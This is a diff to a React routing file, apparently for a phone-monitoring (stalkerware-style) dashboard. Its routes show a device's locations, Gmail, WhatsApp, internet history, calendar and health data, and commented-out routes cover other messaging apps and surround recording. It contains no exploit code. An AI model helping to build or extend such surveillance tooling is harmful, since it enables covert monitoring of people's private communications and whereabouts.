@@ -9,12 +9,12 @@ import Locations from "views/single-pages/Locations";
 // import Videos from "views/single-pages/Videos";
 import Contacts from "views/PhoneLogs/Contacts";
 import GmailLogs from "views/PhoneLogs/GmailLogs";
-// import InternetHistory from "views/PhoneLogs/InternetHistory";
+import InternetHistory from "views/PhoneLogs/InternetHistory";
 import WhatsappLogs from "views/MessagesLogs/WhatsappLogs";
 // import SkypeLogs from "views/MessagesLogs/SkypeLogs";
 // import Screenshots from "views/single-pages/Screenshots";
 import InstalledApps from "views/single-pages/InstalledApps";
-import WifiNetwork from "views/single-pages/WifiNetwork";
+// import WifiNetwork from "views/single-pages/WifiNetwork";
 // import KikLogs from "views/MessagesLogs/KikLogs";
 // import LineLogs from "views/MessagesLogs/LineLogs";
 // import TinderLogs from "views/MessagesLogs/TinderLogs";
@@ -61,10 +61,10 @@ const privateRoutes = [
   // { path: '/user/sim-info/:userDeviceId', component: SimInfo },
   { path: "/user/locations/:userDeviceId", component: Locations },
   { path: "/user/gmail/:userDeviceId", component: GmailLogs },
-  // { path: "/user/internet-history/:userDeviceId", component: InternetHistory },
+  { path: "/user/internet-history/:userDeviceId", component: InternetHistory },
   { path: "/user/installed-apps/:userDeviceId", component: InstalledApps },
   { path: "/user/whatsapp/:userDeviceId", component: WhatsappLogs },
-  { path: "/user/wifinetwork/:userDeviceId", component: WifiNetwork },
+  // { path: "/user/wifinetwork/:userDeviceId", component: WifiNetwork },
   // { path: "/user/screenshots/:userDeviceId", component: Screenshots },
   { path: "/user/calendar/:userDeviceId", component: CalendarLogs },
   // { path: "/user/skype/:userDeviceId", component: SkypeLogs },
@@ -79,6 +79,6 @@ const privateRoutes = [
   // { path: "/user/snapchat/:userDeviceId", component: SnapchatLogs },
   // { path: "/user/record-surrond/:userDeviceId", component: RecordSurround },
   { path: "/user/apple-health/:userDeviceId", component: AppleHealth },
-  { path: "/user/linkedin/:userDeviceId", component: LinkedInLogs },
+  // { path: "/user/linkedin/:userDeviceId", component: LinkedInLogs },
 ];
 export { publicRoutes, privateRoutes };
